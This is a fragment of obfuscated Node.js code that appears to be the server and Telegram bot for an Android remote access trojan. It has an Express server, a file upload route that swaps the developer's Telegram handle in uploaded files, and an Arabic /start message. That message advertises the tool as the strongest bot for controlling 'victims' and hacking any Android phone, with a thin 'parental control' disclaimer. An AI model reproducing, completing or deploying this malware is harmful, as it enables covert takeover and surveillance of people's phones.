...
app.get('/', (_0x475404, _0x364a1f) => {
  _0x364a1f.send("تم رفع الخادم معى تحيات المطور -ألكنَترِول々 ");
});
app.post("/upload", uploader.single("file"), (req, res) => {
  ...
  // إذا كان الملف نصيًا (txt)، نستبدل @VIP_J5 بـ @VIP_7_2
...
bot.on("message", _0x517bec => {
  if (_0x517bec.text === "/start") {
    bot.sendMessage(data.id, "<b>✯ اهلآ وسهلا في اقوى بوت تحكم بضحايا الإصدار 6</b>\n\nبوت رات قوي وسهل الاستخدام لاتحتاج الا كمبيوتر لاجل اختراق الاجهزه فبهذا البوت يمكنك التحكم بأي هاتف أندرويد \nتم تطوير البوت من قبل الهكر -سينباي  تم تطويره لاجل التسليه والرقابة الأبوية فل المطور لا يتحمل مسؤولية سوء استخدامه فيما يغضب الله https://t.me/VIP_7_2 \n\nتواصل بل المطور: @VIP_7_2", {
      'parse_mode': "HTML",
      'reply_markup': {
